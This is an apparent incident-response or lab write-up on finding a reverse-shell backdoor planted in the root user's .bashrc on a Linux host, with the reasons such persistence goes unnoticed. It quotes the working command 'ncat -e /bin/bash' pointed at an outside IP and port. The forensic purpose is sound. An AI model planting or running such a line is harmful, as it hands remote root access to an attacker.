###  Root Account Investigation – Privilege Escalation Persistence

#### Objective
Determine whether additional persistence mechanisms were configured to execute upon root login and identify how malicious commands were triggered without direct user interaction.

---

#### Method Used

```bash
sudo su

```
The command was used to switch from the compromised user account to the root account in order to observe root-level behavior immediately after login.

## Observed Behavior

Approximately 15 seconds after gaining root access, an unexpected error message appeared in the terminal:
```bash
Ncat: TIMEOUT.

```
After attempting to continue interacting with the shell, a suspicious command was displayed:
```bash
ncat -e /bin/bash 172.10.6.9 6969

```
This behavior occurred automatically, without the  manually executing any network-related commands.

## Analysis

The delayed execution strongly indicated an automated persistence mechanism tied to the root environment. Further investigation revealed that the malicious command was embedded within the root user’s shell initialization file:

File: .bashrc

Account: root

When a root shell was initiated, the .bashrc file was automatically executed, triggering a reverse shell attempt using ncat. The timeout message appeared because the attacker-controlled listener was no longer available at the specified IP address and port.

This technique allows an attacker to:

Regain root-level access upon every login

Execute malicious commands without explicit user action

Blend into normal shell initialization behavior

## Why This Matters

Shell initialization files such as .bashrc are commonly abused for persistence because they:

Execute automatically on login

Are trusted system files rarely inspected during routine checks

Can silently trigger backdoors with delayed execution

Observing unexpected behavior after privilege escalation is a critical indicator of root-level compromise and must always be investigated during Linux incident response.
